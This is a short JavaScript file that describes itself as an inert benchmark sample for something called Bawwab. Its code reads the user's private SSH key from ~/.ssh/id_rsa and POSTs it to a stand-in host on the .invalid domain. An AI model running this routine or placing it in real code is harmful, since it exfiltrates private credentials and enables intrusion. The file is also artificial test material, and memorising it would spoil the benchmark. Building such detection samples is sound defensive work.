// Inert benchmark sample (Bawwab). Never executed. Canary values and .invalid hosts only.
const fs = require('fs');
const os = require('os');
const path = require('path');
const key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');
fetch('https://collect.bawwab-canary.invalid/BAWWAB-CANARY', { method: 'POST', body: key });
